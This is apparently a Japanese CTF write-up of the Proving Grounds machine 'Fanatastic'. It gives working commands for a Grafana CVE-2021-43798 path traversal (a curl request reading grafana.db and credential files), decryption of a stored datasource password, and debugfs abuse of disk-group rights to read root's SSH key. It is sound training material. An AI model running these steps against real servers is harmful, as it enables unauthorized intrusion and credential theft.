+++
title = "Proving Grounds Practice - Fanatastic Writeup"
date = "2026-11-22"
description = "Grafana 8.3.0のCVE-2021-43798を利用した任意ファイル読み取りから認証情報を取得し、diskグループとdebugfsを利用してroot権限を取得する"
tags = ["Proving Grounds Practice", "CTF", "[Linux]", "[Fanatastic]", "[Grafana]", "[CVE-2021-43798]", "[Directory Traversal]", "[Arbitrary File Read]", "[Credential Discovery]", "[SSH]", "[debugfs]", "[Disk Group]", "[Privilege Escalation]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Fanatastic |
| OS | Ubuntu Linux |
| Target IP | 192.168.226.181 |
| Domain | N/A |

---

## Reconnaissance

### Nmap Scan

まず、対象ホストに対して全TCPポートのスキャンとサービス検出を実行する。

```bash
nmap -sV -sC -p- 192.168.226.181
```

スキャン結果は以下のとおり。

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
3000/tcp open  http    Grafana http
| http-robots.txt: 1 disallowed entry
|_/
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Grafana
|_Requested resource was /login
9090/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Prometheus Time Series Collection and Processing Server
|_Requested resource was /graph
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

3つのポートが開いていることを確認した。

- 22/tcp：OpenSSH 8.2p1
- 3000/tcp：Grafana
- 9090/tcp：Prometheus

対象ホストではGrafanaとPrometheusが稼働している。まずはWebサービスを起点として調査を進める。

### Grafana Enumeration

ブラウザで以下のURLにアクセスする。

```text
http://192.168.226.181:3000/login
```

Grafanaのログイン画面が表示された。

画面からGrafanaのバージョンが8.3.0であることを確認した。

次に、Searchsploitを使用してGrafanaの既知の脆弱性を調査する。

```bash
searchsploit grafana                
```

検索結果：

```text
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
Grafana 11.6.0 - SSRF                                                            | multiple/webapps/52491.txt
Grafana 7.0.1 - Denial of Service (PoC)                                          | linux/dos/48638.sh
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read                      | multiple/webapps/50581.py
Grafana <=6.2.4 - HTML Injection                                                 | typescript/webapps/51073.txt
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Grafana 8.3.0に対するDirectory TraversalおよびArbitrary File Readの脆弱性が見つかった。

対象ホストのバージョンと一致するため、この脆弱性を利用して内部ファイルを読み取れるか調査する。

---

## Initial Access

### Grafana Directory Traversal - CVE-2021-43798

Searchsploitで見つけたExploitを使用する。

```bash
python3 50581.py -H http://192.168.226.181:3000
```

```text
Read file > /etc/passwd 
```

対象ホストの`/etc/passwd`を読み取ることができた。

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/bin/false
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
grafana:x:113:117::/usr/share/grafana:/bin/false
prometheus:x:1000:1000::/home/prometheus:/bin/false
sysadmin:x:1001:1001::/home/sysadmin:/bin/sh
```

`sysadmin`というユーザーが存在することを確認した。

続いて、Grafanaの設定ファイルを読み取り、暗号化された認証情報の復号に必要な情報を探す。

### Reading grafana.ini

再度Exploitを実行し、Grafanaの設定ファイルを読み取る。

```bash
python3 50581.py -H http://192.168.226.181:3000
```

入力：

```text
Read file > /etc/grafana/grafana.ini
```

設定ファイルから以下の情報を確認できた。

```ini
# default admin user, created on startup
;admin_user = admin

# default admin password, can be changed before first start of grafana,  or in profile settings
;admin_password = admin

# used for signing
;secret_key = SW2YcwTIb9zpOOhoPsMm
```

ここで、GrafanaのSecret Keyを取得できた。

```text
SW2YcwTIb9zpOOhoPsMm
```

この鍵は、Grafanaのデータベースに保存されている暗号化済みの認証情報を復号する際に使用する。

### Downloading grafana.db

次に、Grafanaのデータベースを取得する。

Grafanaのデータベースは以下の場所に保存されている。

```text
/var/lib/grafana/grafana.db
```

`curl`の`--path-as-is`オプションを使用し、Directory Traversalによってデータベースをダウンロードする。

```bash
curl --path-as-is http://192.168.226.181:3000/public/plugins/alertGroups/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
```

ダウンロードしたデータベースをSQLiteで開く。

```bash
sqlite3 grafana.db 
```

テーブル一覧を確認する。

```sql
.tables
```

以下のようなテーブルが存在することを確認できた。

```text
alert
alert_configuration
alert_instance
alert_notification
alert_notification_state
alert_rule
alert_rule_tag
alert_rule_version
annotation
annotation_tag
api_key
builtin_role
cache_data
dashboard
dashboard_acl
dashboard_provisioning
dashboard_snapshot
dashboard_tag
dashboard_version
data_keys
data_source
kv_store
login_attempt
migration_log
ngalert_configuration
org
org_user
permission
playlist
playlist_item
plugin_setting
preferences
quota
role
seed_assignment
server_lock
session
short_url
star
tag
team
team_member
team_role
temp_user
test_data
user
user_auth
user_auth_token
user_role
```

今回はData Sourceの認証情報を格納している`data_source`テーブルに注目する。

### Extracting Data Source Credentials

まず、`data_source`テーブルの内容を確認する。

```sql
select * from data_source;
```

結果から、以下の情報を確認できた。

```text
id              : 1
type            : prometheus
name            : Prometheus
access          : server
url             : http://localhost:9090
basic_auth      : 0
basic_auth_user : sysadmin
is_default      : 0
json_data       : {}
secure_json_data: {"basicAuthPassword":"anBneWFNQ2z+IDGhz3a7wxaqjimuglSXT..."}
```

Data SourceのBasic Authユーザーとして`sysadmin`が設定されていた。

また、`secure_json_data`には暗号化されたパスワードが保存されていることが分かった。

次に、Grafanaのユーザー情報も確認する。

```sql
select * from users;
```

実行結果：

```text
Parse error near line 9: no such table: users
```

テーブル名が`users`ではなかったため、正しいテーブル名で再度確認する。

```sql
select * from user;
```

結果：

```text
id      : 1
version : 0
login   : admin
email   : admin@localhost
password: 63f576276a6db59bb750c34f126945c1e941f9e3b21ab2f5be74ae00cc8abfc1b9f7ee5840f9abdae46efc0ee5350bd65aa8
salt    : 0Vq2cDMrPt
rands   : zt192oddkH
is_admin: 1
```

今回はGrafana管理者のパスワードハッシュではなく、Data Sourceに保存されている暗号化済みパスワードを利用する。

### Decrypting the Data Source Password

Grafanaの暗号化されたパスワードを復号するため、以下のGitHubリポジトリにある`AESDecrypt.go`を利用する。

- [Grafana-CVE-2021-43798 - AESDecrypt.go](https://github.com/jas502n/Grafana-CVE-2021-43798/blob/main/AESDecrypt.go)

最初にプログラムを実行したところ、以下のエラーが発生した。

```bash
go run AESDecrypt.go
```

```text
AESDecrypt.go:12:2: no required module provides package golang.org/x/crypto/pbkdf2: go.mod file not found in current directory or any parent directory; see 'go help modules'
```

原因は、Goのモジュール管理ファイルである`go.mod`が存在せず、必要な外部パッケージを読み込めなかったためである。

そこで、Goモジュールを初期化する。

```bash
go mod init aesdecrypt
```

実行結果：

```text
go: creating new go.mod: module aesdecrypt
go: to add module requirements and sums:
        go mod tidy
```

続いて、必要なパッケージをインストールする。

```bash
go get golang.org/x/crypto/pbkdf2
```

実行結果：

```text
go: downloading golang.org/x/crypto v0.59.0
go: added golang.org/x/crypto v0.59.0
```

これで必要な依存関係を取得できた。

次に、ソースコード内の変数を書き換える。

```go
var grafanaIni_secretKey = "SW2YcwTIb9zpOOhoPsMm"
var dataSourcePassword = "YUVmMzI1V2tnnPyo8o9LU3AFB/eWCSHdwwrOSyzEuj8u8dInddOHifuDUg=="
```

それぞれ、先ほど取得したSecret KeyとData Sourceの暗号化済みパスワードを設定した。

設定後、プログラムを実行する。

```bash
go run AESDecrypt.go   
```

実行結果：

```text
[*] grafanaIni_secretKey= SW2YcwTIb9zpOOhoPsMm
[*] DataSourcePassword= YUVmMzI1V2tnnPyo8o9LU3AFB/eWCSHdwwrOSyzEuj8u8dInddOHifuDUg==
[*] plainText= SuperSecureP@ssw0rd
```

暗号化されていたData Sourceのパスワードを復号できた。

取得した認証情報は以下のとおり。

```text
Username : sysadmin
Password : SuperSecureP@ssw0rd
```

この認証情報を利用してSSH接続を試みる。

### SSH Initial Access

取得した認証情報を使用して、対象ホストにSSH接続する。

```bash
ssh sysadmin@192.168.226.181
```

認証に成功し、`sysadmin`としてログインできた。

ユーザーフラグを確認する。

```bash
cat local.txt
```

結果：

```text
63cd0fd64aa5f1a7929efc98cae9699c
```

これにより、初期アクセスを取得できた。

---

## Privilege Escalation

### Linux Group Enumeration

次に、現在のユーザーが持つ権限を確認する。

```bash
id
```

実行結果：

```text
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin),6(disk)
```

ここで注目すべきなのは、`sysadmin`が`disk`グループに所属している点である。

Linuxの`disk`グループは、ディスクデバイスへのアクセス権限を持つ。

この権限を利用すると、ファイルシステムのアクセス制御を介さずに、ディスク上のデータを直接読み取れる可能性がある。

そこで、ルートファイルシステムのデバイスを確認する。

### Disk Enumeration

`df -h`を使用して、ファイルシステムのマウント状況を確認する。

```bash
df -h
```

実行結果：

```text
Filesystem      Size  Used Avail Use% Mounted on
udev            445M     0  445M   0% /dev
tmpfs            98M  1.2M   97M   2% /run
/dev/sda2       9.8G  6.3G  3.1G  68% /
tmpfs           489M     0  489M   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           489M     0  489M   0% /sys/fs/cgroup
/dev/loop1       56M   56M     0 100% /snap/core18/2284
/dev/loop2       62M   62M     0 100% /snap/core20/1328
/dev/loop3       56M   56M     0 100% /snap/core18/2128
/dev/loop0       68M   68M     0 100% /snap/lxd/21835
/dev/loop5       44M   44M     0 100% /snap/snapd/14549
/dev/loop6       71M   71M     0 100% /snap/lxd/21029
/dev/loop4       33M   33M     0 100% /snap/snapd/12883
tmpfs            98M     0   98M   0% /run/user/1001
```

ルートファイルシステムが`/dev/sda2`に存在することを確認した。

`sysadmin`は`disk`グループに所属しているため、このデバイスに直接アクセスできる。

### Reading Root SSH Private Key with debugfs

`debugfs`は、ext2/ext3/ext4ファイルシステムを調査するためのツールである。

今回は、`/dev/sda2`を直接開き、rootのSSH秘密鍵を読み取る。

```bash
debugfs /dev/sda2
```

`debugfs`のプロンプトが表示されたら、以下を実行する。

```text
debugfs:  cat /root/.ssh/id_rsa
```

すると、rootのSSH秘密鍵を取得できた。

取得した秘密鍵をKali Linux側に`id_rsa`として保存する。

※ 秘密鍵の内容は省略する。

### SSH as root

取得したSSH秘密鍵を使用して、rootとしてSSH接続する。

```bash
ssh -i id_rsa root@192.168.226.181    
```

SSH接続に成功し、rootシェルを取得できた。

```text
root@fanatastic:~#
```

最後にrootフラグを確認する。

```bash
cat proof.txt
```

結果：

```text
eede4131828b318715f80a5d45c30102
```

これにより、root権限の取得に成功した。

---

## Summary

今回のFanatasticでは、Grafana 8.3.0のCVE-2021-43798を利用した任意ファイル読み取りから初期アクセスにつなげ、最終的にLinuxの`disk`グループの権限を利用してroot権限を取得した。

最初に、Grafanaのバージョンを調査したところ、8.3.0で稼働していることが分かった。

Searchsploitで対応する脆弱性を調査し、CVE-2021-43798を利用して`/etc/passwd`や`grafana.ini`などのファイルを読み取った。

さらに、Grafanaのデータベース`grafana.db`を取得し、`data_source`テーブルから暗号化されたData Sourceのパスワードを発見した。

`grafana.ini`から取得したSecret Keyと暗号化済みパスワードを`AESDecrypt.go`に設定し、復号した結果、`sysadmin`の認証情報を取得できた。

その認証情報を利用してSSH接続し、初期アクセスを取得した。

権限昇格では、`sysadmin`が`disk`グループに所属していることに注目した。

`debugfs`でルートファイルシステムのデバイス`/dev/sda2`を直接開き、rootのSSH秘密鍵を取得した。

最後に、取得した秘密鍵を利用してrootとしてSSH接続し、rootフラグを取得した。

### 攻略手順まとめ

1. Nmapによるポート・サービス列挙
2. Grafana 8.3.0のバージョン特定
3. SearchsploitによるCVE-2021-43798の発見
4. Directory Traversalによる任意ファイル読み取り
5. `grafana.ini`からSecret Keyを取得
6. `grafana.db`をダウンロード
7. SQLiteでData Sourceの暗号化パスワードを取得
8. Goの依存関係を設定し、AESDecrypt.goでパスワードを復号
9. SSHで`sysadmin`として初期アクセス
10. `id`で`disk`グループへの所属を確認
11. `df -h`でルートファイルシステムのデバイスを確認
12. `debugfs`で`/dev/sda2`にアクセス
13. rootのSSH秘密鍵を取得
14. SSHでrootとしてログイン
15. `proof.txt`からrootフラグを取得

### Flags

| Flag | Value |
|------|-------|
| local.txt | `63cd0fd64aa5f1a7929efc98cae9699c` |
| proof.txt | `eede4131828b318715f80a5d45c30102` |

### Key Takeaways

- **CVE-2021-43798**：GrafanaのDirectory Traversalを利用して、サーバー内部のファイルを読み取れる。
- **Grafana Credential Decryption**：`grafana.ini`のSecret Keyと`grafana.db`のData Source情報から、保存された認証情報を復号できる。
- **disk Group**：`disk`グループへの所属は、ディスクデバイスへの直接アクセスにつながるため、非常に強力な権限となる。
- **debugfs**：ファイルシステムを直接調査することで、通常のファイルアクセス制御を介さずにrootのSSH秘密鍵を取得できる。

今回のマシンでは、Grafanaの脆弱性による情報漏洩と、Linuxのグループ権限設定の不備が、初期アクセスからroot権限取得までの重要なポイントだった。
